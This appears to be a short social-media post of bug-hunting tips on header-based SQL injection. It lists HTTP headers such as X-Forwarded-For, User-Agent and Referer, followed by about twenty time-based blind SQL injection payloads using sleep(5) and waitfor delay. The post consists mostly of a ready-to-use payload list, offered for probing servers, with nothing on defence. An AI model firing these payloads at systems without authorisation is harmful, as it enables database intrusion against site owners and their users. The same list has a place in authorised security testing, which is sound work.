Can't find SQL injections?

You should try header based SQLi's 👇

🔴 What's that?
Vuln. that allows hackers to exploit SQL injections through HTTP headers being sent between the browser and server.

🟡 But where to find it?
Inject payloads inside of basic HTTP headers

🟢 What payloads do I use?
Use my favorite payloads:

If the injection works, the response will have a delay of 5 seconds!
 
INSIDE OF THESE HTTP HEADERS INJECT BELOW PAYLOADS:
X-Forwarded-For
User-agent
Referer
Accept
Accept-Charset
Content-Type
Connection
Content-Length
X-Client-Ip
X-Remote-Ip
X-Host
X-Forwarded-Host
 
USE THESE PAYLOADS:
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
